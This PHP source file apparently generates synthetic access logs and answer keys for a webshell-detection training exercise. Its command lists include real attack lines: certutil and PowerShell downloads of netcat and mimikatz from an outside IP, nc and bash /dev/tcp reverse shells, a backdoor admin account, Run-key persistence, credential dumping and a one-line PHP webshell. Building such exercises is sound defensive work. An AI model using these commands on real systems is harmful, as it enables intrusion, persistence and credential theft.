<?php
/**
 * Pulse Generator — Webshell Attack Scenario
 * Generates webshell command execution patterns
 * Shell disguised as /uploads/products/.cache-img.php
 */

require_once __DIR__ . '/config.php';

/**
 * Get webshell command chains based on difficulty
 * Returns arrays of [raw_command, url_encoded_command]
 */
function getWebshellCommands($difficulty = 'medium') {
    // Realistic attack progression: recon → enum → persistence → exfil
    $recon = [
        ['whoami', 'whoami'],
        ['id', 'id'],
        ['hostname', 'hostname'],
        ['uname -a', 'uname%20-a'],
        ['pwd', 'pwd'],
        ['ipconfig', 'ipconfig'],
        ['systeminfo', 'systeminfo'],
        ['dir C:\\xampp\\htdocs', 'dir%20C%3A%5Cxampp%5Chtdocs'],
        ['type C:\\xampp\\htdocs\\brightmall\\includes\\db.php', 'type%20C%3A%5Cxampp%5Chtdocs%5Cbrightmall%5Cincludes%5Cdb.php'],
        ['echo %USERNAME%', 'echo%20%25USERNAME%25'],
        ['echo %COMPUTERNAME%', 'echo%20%25COMPUTERNAME%25'],
    ];

    $enum = [
        ['net user', 'net%20user'],
        ['net localgroup administrators', 'net%20localgroup%20administrators'],
        ['tasklist', 'tasklist'],
        ['netstat -ano', 'netstat%20-ano'],
        ['dir C:\\Users', 'dir%20C%3A%5CUsers'],
        ['dir C:\\xampp\\mysql\\data', 'dir%20C%3A%5Cxampp%5Cmysql%5Cdata'],
        ['type C:\\xampp\\phpMyAdmin\\config.inc.php', 'type%20C%3A%5Cxampp%5CphpMyAdmin%5Cconfig.inc.php'],
        ['type C:\\xampp\\passwords.txt', 'type%20C%3A%5Cxampp%5Cpasswords.txt'],
        ['reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', 'reg%20query%20HKLM%5CSOFTWARE%5CMicrosoft%5CWindows%5CCurrentVersion%5CRun'],
        ['wmic os get caption,version', 'wmic%20os%20get%20caption%2Cversion'],
    ];

    $persistence = [
        ['net user hacker P@ssw0rd123 /add', 'net%20user%20hacker%20P%40ssw0rd123%20%2Fadd'],
        ['net localgroup administrators hacker /add', 'net%20localgroup%20administrators%20hacker%20%2Fadd'],
        ['schtasks /create /tn "WindowsUpdate" /tr "C:\\xampp\\htdocs\\uploads\\products\\shell.exe" /sc onstart', 'schtasks%20%2Fcreate%20%2Ftn%20%22WindowsUpdate%22%20%2Ftr%20%22C%3A%5Cxampp%5Chtdocs%5Cuploads%5Cproducts%5Cshell.exe%22%20%2Fsc%20onstart'],
        ['reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d C:\\xampp\\htdocs\\uploads\\products\\shell.exe', 'reg%20add%20HKCU%5CSoftware%5CMicrosoft%5CWindows%5CCurrentVersion%5CRun%20%2Fv%20Updater%20%2Ft%20REG_SZ%20%2Fd%20C%3A%5Cxampp%5Chtdocs%5Cuploads%5Cproducts%5Cshell.exe'],
    ];

    $exfil = [
        ['certutil -urlcache -split -f http://185.156.73.54/nc.exe C:\\Windows\\Temp\\nc.exe', 'certutil%20-urlcache%20-split%20-f%20http%3A%2F%2F185.156.73.54%2Fnc.exe%20C%3A%5CWindows%5CTemp%5Cnc.exe'],
        ['powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(\'http://185.156.73.54/rev.ps1\')"', 'powershell%20-ep%20bypass%20-c%20%22IEX%28New-Object%20Net.WebClient%29.DownloadString%28%27http%3A%2F%2F185.156.73.54%2Frev.ps1%27%29%22'],
        ['C:\\Windows\\Temp\\nc.exe 185.156.73.54 4444 -e cmd.exe', 'C%3A%5CWindows%5CTemp%5Cnc.exe%20185.156.73.54%204444%20-e%20cmd.exe'],
        ['powershell Compress-Archive -Path C:\\xampp\\htdocs\\brightmall\\includes -DestinationPath C:\\Windows\\Temp\\loot.zip', 'powershell%20Compress-Archive%20-Path%20C%3A%5Cxampp%5Chtdocs%5Cbrightmall%5Cincludes%20-DestinationPath%20C%3A%5CWindows%5CTemp%5Cloot.zip'],
        ['certutil -urlcache -split -f http://185.156.73.54/mimikatz.exe C:\\Windows\\Temp\\mimi.exe', 'certutil%20-urlcache%20-split%20-f%20http%3A%2F%2F185.156.73.54%2Fmimikatz.exe%20C%3A%5CWindows%5CTemp%5Cmimi.exe'],
        ['C:\\Windows\\Temp\\mimi.exe "privilege::debug" "sekurlsa::logonpasswords" exit', 'C%3A%5CWindows%5CTemp%5Cmimi.exe%20%22privilege%3A%3Adebug%22%20%22sekurlsa%3A%3Alogonpasswords%22%20exit'],
    ];

    $linuxRecon = [
        ['cat /etc/passwd', 'cat%20%2Fetc%2Fpasswd'],
        ['cat /etc/shadow', 'cat%20%2Fetc%2Fshadow'],
        ['ls -la /var/www', 'ls%20-la%20%2Fvar%2Fwww'],
        ['find / -perm -4000 2>/dev/null', 'find%20%2F%20-perm%20-4000%202%3E%2Fdev%2Fnull'],
        ['crontab -l', 'crontab%20-l'],
        ['wget http://185.156.73.54/linpeas.sh -O /tmp/lp.sh', 'wget%20http%3A%2F%2F185.156.73.54%2Flinpeas.sh%20-O%20%2Ftmp%2Flp.sh'],
        ['chmod +x /tmp/lp.sh && /tmp/lp.sh', 'chmod%20%2Bx%20%2Ftmp%2Flp.sh%20%26%26%20%2Ftmp%2Flp.sh'],
        ['bash -i >& /dev/tcp/185.156.73.54/4444 0>&1', 'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F185.156.73.54%2F4444%200%3E%261'],
    ];

    switch ($difficulty) {
        case 'easy':
            return array_merge($recon, array_slice($enum, 0, 3));
        case 'medium':
            return array_merge($recon, $enum, array_slice($persistence, 0, 2), array_slice($exfil, 0, 2));
        case 'hard':
            return array_merge($recon, $enum, $persistence, $exfil, $linuxRecon);
        default:
            return array_merge($recon, $enum, array_slice($persistence, 0, 2), array_slice($exfil, 0, 2));
    }
}

/**
 * Shell path variants by difficulty
 */
function getShellPaths($difficulty) {
    $paths = [
        '/uploads/products/.cache-img.php',
    ];

    if ($difficulty === 'hard') {
        $paths[] = '/assets/js/.jquery.backup.php';
        $paths[] = '/uploads/products/thumb_cache.php';
    }

    return $paths;
}

/**
 * Shell parameter variants
 */
function getShellParams($difficulty) {
    if ($difficulty === 'easy') {
        return ['cmd'];
    }
    if ($difficulty === 'medium') {
        return ['cmd', 'v'];
    }
    // hard — more obfuscated param names
    return ['cmd', 'v', 'id', 'q'];
}

/**
 * Generate webshell attack log lines
 * 
 * @param int $attackerCount Number of attacker IPs using the shell
 * @param string $difficulty easy|medium|hard
 * @param DateTime $startTime
 * @param DateTime $endTime
 * @return array ['lines' => [...], 'answers' => [...]]
 */
function generateWebshell($attackerCount, $difficulty, $startTime, $endTime) {
    $lines = [];

    // Read overrides
    $customShellPath = getOverride('shell_path', null);
    $customShellParam = getOverride('shell_param', null);
    $customCommands = getOverride('shell_commands', null);

    $answers = [
        'type' => 'Webshell',
        'shell_paths' => [],
        'attacker_ips' => [],
        'commands_executed' => [],
    ];

    $attackerIps = pickN(
        !empty($GLOBALS['pulse_attacker_ips']) ? $GLOBALS['pulse_attacker_ips'] : ATTACKER_IP_POOL,
        $attackerCount
    );

    // Use custom commands if provided
    if ($customCommands && is_array($customCommands) && count($customCommands) > 0) {
        $commands = array_map(fn($c) => [$c, urlencode($c)], $customCommands);
    } else {
        $commands = getWebshellCommands($difficulty);
    }

    // Use custom shell path if provided
    if ($customShellPath) {
        $shellPaths = [$customShellPath];
    } else {
        $shellPaths = getShellPaths($difficulty);
    }

    // Use custom param if provided
    if ($customShellParam) {
        $shellParams = [$customShellParam];
    } else {
        $shellParams = getShellParams($difficulty);
    }

    $startTs = $startTime->getTimestamp();
    $endTs = $endTime->getTimestamp();

    $answers['attacker_ips'] = $attackerIps;
    $answers['shell_paths'] = $shellPaths;

    foreach ($attackerIps as $ipIdx => $ip) {
        $ua = pick(ATTACKER_USER_AGENTS);
        $shellPath = $shellPaths[$ipIdx % count($shellPaths)];
        $param = $shellParams[$ipIdx % count($shellParams)];

        // Attack starts after some offset
        $attackStart = mt_rand(
            $startTs + intval(($endTs - $startTs) * 0.2),
            $startTs + intval(($endTs - $startTs) * 0.5)
        );
        $currentTs = $attackStart;

        // First access — check if shell is alive (no params or simple test)
        $ts = new DateTime();
        $ts->setTimestamp($currentTs);
        $lines[] = [
            'timestamp' => clone $ts,
            'line' => formatLogLine(
                $ip, $ts, 'GET', $shellPath, 'HTTP/1.1',
                200, randBetween(64, 256), '-', $ua
            ),
        ];
        $currentTs += mt_rand(3, 10);

        // Execute commands in order (simulates attack progression)
        $selectedCommands = $commands;
        $cmdCount = match($difficulty) {
            'easy' => mt_rand(6, 10),
            'medium' => mt_rand(12, 20),
            'hard' => mt_rand(18, count($selectedCommands)),
            default => mt_rand(12, 20),
        };
        $selectedCommands = array_slice($selectedCommands, 0, $cmdCount);

        foreach ($selectedCommands as $cmd) {
            $rawCmd = $cmd[0];
            $encodedCmd = $cmd[1];

            $path = $shellPath . '?' . $param . '=' . $encodedCmd;
            $status = 200;
            $size = randBetween(128, 8192);

            $answers['commands_executed'][] = $rawCmd;

            $ts = new DateTime();
            $ts->setTimestamp($currentTs);

            $lines[] = [
                'timestamp' => clone $ts,
                'line' => formatLogLine(
                    $ip, $ts, 'GET', $path, 'HTTP/1.1',
                    $status, $size, '-', $ua
                ),
            ];

            // Variable delay — sometimes quick (copy-pasting), sometimes slow (reading output)
            if (mt_rand(1, 4) === 1) {
                $currentTs += mt_rand(1, 5);   // quick follow-up
            } else {
                $currentTs += mt_rand(8, 45);  // reading/thinking
            }
        }

        // On hard mode, attacker might also POST commands
        if ($difficulty === 'hard' && mt_rand(1, 2) === 1) {
            $postCmds = [
                ['powershell -ep bypass -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAA=', 'powershell -ep bypass -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAA='],
                ['echo "<?php system($_GET[x]); ?>" > C:\\xampp\\htdocs\\brightmall\\error.php', 'echo "<?php system($_GET[x]); ?>" > C:\\xampp\\htdocs\\brightmall\\error.php'],
            ];
            foreach ($postCmds as $pcmd) {
                $currentTs += mt_rand(10, 30);
                $ts = new DateTime();
                $ts->setTimestamp($currentTs);
                $lines[] = [
                    'timestamp' => clone $ts,
                    'line' => formatLogLine(
                        $ip, $ts, 'POST', $shellPath, 'HTTP/1.1',
                        200, randBetween(64, 512), '-', $ua
                    ),
                ];
                $answers['commands_executed'][] = $pcmd[0] . ' (POST)';
            }
        }
    }

    // Deduplicate commands in answers
    $answers['commands_executed'] = array_values(array_unique($answers['commands_executed']));

    return ['lines' => $lines, 'answers' => $answers];
}
